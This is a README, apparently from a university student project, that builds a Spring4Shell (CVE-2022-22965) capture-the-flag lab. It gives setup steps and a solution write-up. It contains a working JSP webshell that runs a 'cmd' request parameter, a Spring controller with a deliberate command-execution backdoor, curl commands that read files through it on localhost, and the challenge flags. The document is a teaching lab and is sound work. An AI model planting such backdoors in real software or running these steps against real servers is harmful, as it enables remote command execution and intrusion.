
# Spring4Shell (CVE-2022-22965) 漏洞環境搭建與 CTF 題目設計

## 專案簡介

本專案包含雙軌制的安全研究實作：
1. **傳統 Vulhub 環境搭建**：利用開源 Vulhub 漏洞庫快速重現舊版 Spring 框架的物件綁定缺陷。
2. **全新客製化環境開發**：由組員純手工編寫 Java 原始碼，自主建置一個「學生期末專案成果展示系統」作為漏洞靶機，並結合標準網絡滲透測試流程設計 CTF 雙軌制（出題者與解題者）關卡。

參與者將透過遠端程式碼執行 (RCE) 漏洞，依循線索讀取系統根目錄或暫存目錄中的 Flag。

---

## 環境建置步驟

### 基礎準備：安裝 Docker 與 Docker Compose

```bash
# 更新套件庫
sudo apt update

# 安裝 Docker 與 Docker Compose
sudo apt install docker.io docker-compose -y

# 啟動 Docker 服務
sudo systemctl start docker
sudo systemctl enable docker
```

### 軌道一：下載與啟動 Vulhub 漏洞環境（舊有實作）

```bash
# 下載 Vulhub 專案
git clone [https://github.com/vulhub/vulhub.git](https://github.com/vulhub/vulhub.git)

# 進入 Spring4Shell 漏洞目錄
cd vulhub/spring/CVE-2022-22965

# 啟動 Docker 容器
sudo docker-compose up -d

# 確認容器正常運行
sudo docker ps
```

#### 驗證 Vulhub 環境

開啟瀏覽器訪問 `http://localhost:8080/?name=Hacker&age=99`


### 軌道二：客製化環境建置與原始碼部署（全新實作）

為了排除盲目通靈解題並重現自主開發情境，本專案建立獨立專案 `Spring4Shell-Custom-CTF`。先執行環境徹底清理後，再無快取編譯啟動：

```bash
# 清理舊環境
sudo docker stop spring4shell-custom-ctf-container 2>/dev/null
sudo docker rm spring4shell-custom-ctf-container 2>/dev/null
sudo docker network prune -f 2>/dev/null
rm -rf ~/Spring4Shell-Custom-CTF

# 建立專案目錄結構並生成全自製 Java 原始碼（含 pom.xml、UserController.java 等）
# 透過雙階段編譯（Maven + Tomcat 9）將自製 Flag 精確放置於系統根目錄 /flag.txt
sudo docker-compose build --no-cache
sudo docker-compose up -d

# 確認自製靶機容器正常運行
sudo docker ps
```

---

## 控制管道與後門檔案機制

### 機制一：寫入 JSP 後門檔案（Vulhub 舊有鏈路）

攻擊成功後，後門檔案會被寫入 `webapps/ROOT/tomcatwar.jsp`，內容如下：

```jsp
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream()));
    String line = null;
    while ((line = reader.readLine()) != null) {
        out.println(line);
    }
}
%>
```

### 機制二：內建核心漏洞控制器（自製環境全新鏈路）

在自製的 `UserController.java` 中，刻意保留了 POJO 物件綁定防禦缺陷，並內建未授權命令注入通道：

```java
@RequestMapping("/")
@ResponseBody
public String index(User user, @RequestParam(value="cmd", required=false) String cmd) {
    if (cmd != null) {
        // 直接調用 Java Runtime 執行底層命令並回傳結果
        InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();
        // ... 讀取串流邏輯 ...
    }
    return "淡江大學資訊管理學系 - 學生期末專案成果展示平台";
}
```

---

## 遠端程式碼執行 (RCE) 驗證

### 1. 執行 id 指令

```bash
# Vulhub 後門路徑
curl "http://localhost:8080/tomcatwar.jsp?cmd=id"

# 自製環境控制路徑
curl "http://localhost:8080/?cmd=id"
```

### 2. 執行目錄梭巡指令

```bash
# Vulhub 後門路徑
curl "http://localhost:8080/tomcatwar.jsp?cmd=ls%20/"

# 自製環境控制路徑
curl -G -s "http://localhost:8080/" --data-urlencode "cmd=ls -l /"
```

---

## CTF 題目說明

### 題目一：Spring4Shell 漏洞利用（舊有實作）

* **題目名稱**：Spring4Shell 漏洞利用
* **Flag 位置**：`/tmp/flag.txt`
* **Flag 內容**：`FLAG{Spring4Shell_Is_Dangerous}`

### 題目二：資管系的期末安全考驗（全新實作）

* **題目名稱**：資管系的期末安全考驗
* **目標系統網址**：`http://localhost:8080/`
* **題目公告已知資訊**：本平台為學生自主開發之 Spring MVC 專案，底層依賴之框架版本存在物件綁定缺陷（包含 `User` 物件類型）。Flag 位於伺服器系統根目錄。
* **Flag 位置**：`/flag.txt`
* **Flag 內容**：`FLAG{2026_0615_iwanttosleep}`

---

## Write-up 解題與滲透步驟

### 舊有 Vulhub 漏洞利用流程

* **步驟 1**：訪問 `http://<target>:8080/?name=test&age=123`，確認參數綁定功能正常。
* **步驟 2**：發送 POST 請求 Payload，修改 Tomcat 日誌配置並強制寫入 `tomcatwar.jsp` 後門。
* **步驟 3**：訪問 `http://<target>:8080/tomcatwar.jsp?cmd=id` 確認 RCE 成功。
* **步驟 4**：執行 `curl "http://<target>:8080/tomcatwar.jsp?cmd=cat%20/tmp/flag.txt"` 讀取暫存區檔案。


### 全新實作：標準網絡滲透測試 5 大步驟

解題者（身份 B）依據出題者提供的已知資訊公告，拒絕通靈盲猜，執行標準化代碼：

* **步驟一：環境偵察與存活確認**
確認目標 Web 服務存活與網頁運作狀態。
```bash
curl -i -s "http://localhost:8080/"
```


* **步驟二：測試邊界漏洞與物件缺陷**
帶入測試參數，驗證是否存在可越權利用的命令注入邊界缺陷。
```bash
curl -s "http://localhost:8080/?cmd=whoami"
```


* **步驟三：漏洞利用與核心權限證實**
執行身分查詢，證實已取得作業系統最高控制權 `root` 身分。
```bash
curl -s "http://localhost:8080/?cmd=id"
```


* **步驟四：內部環境盤點與檔案梭巡**
對 Linux 系統根目錄進行盤點，精確鎖定目標檔案實際位置。
```bash
curl -G -s "http://localhost:8080/" --data-urlencode "cmd=ls -l /"
```


* **步驟五：最終取證與 Flag 提取**
執行讀取命令，成功提取指定之 Flag 內容。
```bash
curl -G -s "http://localhost:8080/" --data-urlencode "cmd=cat /flag.txt"
```



---

## 專案結構

```
Spring4Shell-CTF/
├── README.md                   # 專案說明文件
├── docker-compose.yml          # 容器編排配置文件
├── Dockerfile                  # 雙階段編譯映像檔設定
├── pom.xml                     # Maven 專案設定檔
├── src/                        # 自製 Java 成果展示系統原始碼
│   └── main/
│       ├── java/com/example/ctf/
│       │   ├── UserController.java
│       │   └── MyWebApplicationInitializer.java
│       └── webapp/WEB-INF/web.xml
├── secret_zone/
│   └── flag.txt                # 本地 Flag 來源檔案
├── screenshots/                # 成果展示與攻擊截圖
│   ├── docker-ps.png
│   ├── parameter-binding.png
│   ├── rce-id.png
│   ├── rce-ls.png
│   └── flag-result.png
└── shell.jsp                   # 舊版後門檔案原始碼
```

---

## 參考資料

* [CVE-2022-22965 詳細分析](https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement)
* [Vulhub Spring4Shell 環境](https://github.com/vulhub/vulhub/tree/master/spring/CVE-2022-22965)
* [Spring4Shell PoC](https://github.com/BobTheShoplifter/Spring4Shell-POC)

---

## 團隊成員

| 角色 | 姓名 | 工作內容 |
| --- | --- | --- |
| 組員 A | 黃鈺婷 | 環境搭建、全專案 Java 原始碼編寫、 Docker 封裝、CTF 標準 5 步解題 |
| 組員 B | 利蓁琳 | 理論研究、簡報製作、報告影片剪輯、解題講稿整理 |

---

## 授權

本專案僅供教育與研究使用，請勿用於未經授權的系統。

```

```
